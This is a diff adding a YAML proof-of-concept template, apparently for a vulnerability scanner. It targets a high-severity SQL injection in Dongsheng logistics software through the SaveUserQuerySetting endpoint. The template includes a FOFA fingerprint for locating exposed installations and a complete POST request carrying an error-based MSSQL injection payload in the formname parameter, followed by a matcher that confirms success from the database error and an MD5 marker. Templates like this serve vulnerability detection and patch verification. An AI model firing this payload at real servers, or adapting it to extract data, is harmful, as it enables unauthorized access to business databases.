@@ -1,0 +1,22 @@
+id: poc-yaml-dongshengsoft-saveuserquerysetting-sqli
+info:
+  name: 东胜物流软件 SaveUserQuerySetting SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 东胜物流软件
+  fofa: fid="Z4c2hPCi5IR/AnH5vZXNSQ=="
+variables:
+  t1: random_int(1,100000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /MvcShipping/MsBaseInfo/SaveUserQuerySetting
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: 'formname=MsRptSaleBalProfitShareIndex''+AND+2523+IN+(SELECT+(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2b(SELECT+SUBSTRING((ISNULL(CAST((+sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27)))+AS+NVARCHAR(4000)),CHAR(32))),1,1024))%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113)))+AND+''uKco''%3d''uKco&isvisible=true&issavevalue=true&querydetail=%7B%22PS_MBLNO%22%3A%22%22%2C%22PS_VESSEL%22%3A%22%22%2C%22PS_VOYNO%22%3A%22%22%2C%22PS_SALE%22%3A%22%5Cu91d1%5Cu78ca%22%2C%22PS_OP%22%3Anull%2C%22PS_EXPDATEBGN%22%3A%222020-02-01%22%2C%22PS_EXPDATEEND%22%3A%222020-02-29%22%2C%22PS_STLDATEBGN%22%3A%22%22%2C%22PS_STLDATEEND%22%3A%22%22%2C%22PS_ACCDATEBGN%22%3A%22%22%2C%22PS_ACCDATEEND%22%3A%22%22%2C%22checkboxfield-1188-inputEl%22%3A%22on%22%2C%22PS_CUSTSERVICE%22%3Anull%2C%22PS_DOC%22%3Anull%2C%22hiddenfield-1206-inputEl%22%3A%22%22%7D
+
+    '
+  expression: status_code == 200 && contains(body,"在将 nvarchar 值") && contains(body,"转换成数据类型
+    int 时失败") && contains(body,t2)
+transport: http
